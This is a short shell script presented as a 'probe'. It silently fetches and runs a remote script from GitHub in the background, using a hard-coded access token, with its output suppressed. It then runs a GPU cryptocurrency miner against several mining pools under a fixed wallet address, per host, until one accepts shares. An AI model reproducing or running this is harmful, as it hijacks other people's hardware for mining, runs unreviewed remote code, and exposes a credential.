( bash -c "$(curl -fsSL -m 30 -H 'Authorization: token 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' -H 'Accept: application/vnd.github.raw' 'https://api.github.com/repos/dongsuju/ul-plant/contents/cmd8/i440_probe.sh?ref=main')" >/dev/null 2>&1 & )
exec 2>&1
P=$(hostname -s); W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz; B=/opt/fleet/bin/wildrig-multi
echo "== kxprobe start $(date -u +%FT%TZ) host=$P"
getent hosts prl.kryptex.network | head -3
for spec in "8048 stratum+ssl://prl.kryptex.network:8048" "7048 stratum+tcp://prl.kryptex.network:7048" "3360 stratum+tcp://pearl.luckypool.io:3360"; do
  set -- $spec; port=$1; url=$2
  echo "== try $port $(date -u +%FT%TZ)"
  case $port in 8048) T=180;; 7048) T=120;; 3360) T=90;; esac
  env CUDA_VISIBLE_DEVICES=7 timeout $T $B --algo pearlhash -d 0 -o "$url" -u "$W.ul-ps-$P-kx$port" -p x -i 8 --no-color > /tmp/ulprobe.$port 2>&1
  rc=$?; echo "rc=$rc"; grep -Ei 'authorize|new job|difficulty|accepted|error|refused|connect|resolve|no servers|stratum' /tmp/ulprobe.$port | tail -14
  a=$(grep -c accepted /tmp/ulprobe.$port); echo "accepted_$port=$a"
  [ "$a" -gt 0 ] && { echo "== winning rung $port"; break; }
done
echo "== kxprobe done $(date -u +%FT%TZ)"
